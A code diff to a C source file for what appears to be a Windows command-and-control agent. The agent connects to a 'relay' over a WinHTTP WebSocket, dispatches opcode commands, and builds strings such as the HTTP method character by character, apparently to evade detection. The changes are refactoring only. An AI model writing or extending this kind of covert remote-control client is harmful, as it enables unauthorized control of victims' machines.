@@ -7,6 +7,7 @@
 #include "stackstrings.h"
 #include "commands.h"
 #include "string.h"
+#include "wire.h"
 
 static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);
 
@@ -106,17 +107,10 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     }
     BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
 
-    WCHAR scheme[6];
-    if (https) {
-        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p';
-        scheme[4]=L's'; scheme[5]=0;
-    } else {
-        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p'; scheme[4]=0;
-    }
     LOG_INFO("Connecting to relay %ls...", host);
 
     WCHAR ua_buf[18];
-    StrUserAgent(ua_buf);
+    BuildUserAgent(ua_buf);
     session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }
 
@@ -127,7 +121,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     if (https) request_flags |= WINHTTP_FLAG_SECURE;
 
     WCHAR get_buf[4];
-    StrGetMethodW(get_buf);
+    get_buf[0] = L'G'; get_buf[1] = L'E'; get_buf[2] = L'T'; get_buf[3] = L'\0';
     request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }
 
@@ -188,13 +182,14 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         }
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
-        unsigned int corr_id = (msg.length >= 5) ? read_u32_le_at(msg.data, 1) : 0;
+        unsigned int corr_id = (msg.length >= 5) ? ReadU32LE(msg.data, 1) : 0;
 
         if (msg.truncated) {
             unsigned char status_error[8];
             MemoryZero(status_error, sizeof(status_error));
 
-            write_u32_le_at(status_error, 4, corr_id);
+            int pos = 4;
+            WriteU32LE(status_error, &pos, corr_id);
             err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
             
             if (err == NO_ERROR) {
@@ -234,7 +229,8 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             unsigned char status_error[8];
             MemoryZero(status_error, sizeof(status_error));
 
-            write_u32_le_at(status_error, 4, corr_id);
+            int pos = 4;
+            WriteU32LE(status_error, &pos, corr_id);
             err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
                 LOG_INFO("Command 0x%02x not implemented - replied status 1 (corr=%u)", opcode, corr_id);
